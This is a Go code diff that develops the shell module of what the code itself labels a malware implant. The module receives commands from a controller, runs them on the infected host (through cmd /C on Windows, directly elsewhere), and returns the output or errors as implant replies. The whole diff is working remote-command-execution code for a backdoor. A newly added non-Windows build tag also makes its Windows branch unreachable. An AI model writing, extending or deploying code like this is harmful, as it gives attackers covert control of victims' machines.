@@ -1,10 +1,13 @@
+// +build !windows
 package sh
 
 import (
-	"malware/common"
+	"fmt"
 	"malware/common/messages"
 	"malware/common/types"
 	"os/exec"
+	"runtime"
+	"strings"
 )
 
 type state struct {
@@ -27,12 +30,21 @@ func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback
 		return
 	}
 
-	out, err := exec.Command(cmd.Exec, cmd.Args...).Output()
+	var out []byte
+	var err error
+
+	if runtime.GOOS == "windows" {
+		args := strings.Join(cmd.Args, " ")
+		out, err = exec.Command("cmd", "/C", cmd.Exec+" "+args).Output()
+	} else {
+		out, err = exec.Command(cmd.Exec, cmd.Args...).Output()
+	}
+	fmt.Println(err)
 	if err != nil {
-		common.Panicf(err, "Error on running command: %s", message)
+		callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte(err.Error())})
 	}
 
-	callback(&messages.ImplantReply{Module: "sh", Args: out})
+	callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
 }
 
 // Init the state of this module
@@ -44,4 +56,4 @@ func (settings settings) Shutdown() {
 	settings.state.running = false
 }
 
-func (settings) ID() string { return "adam" }
+func (settings) ID() string { return "sh" }
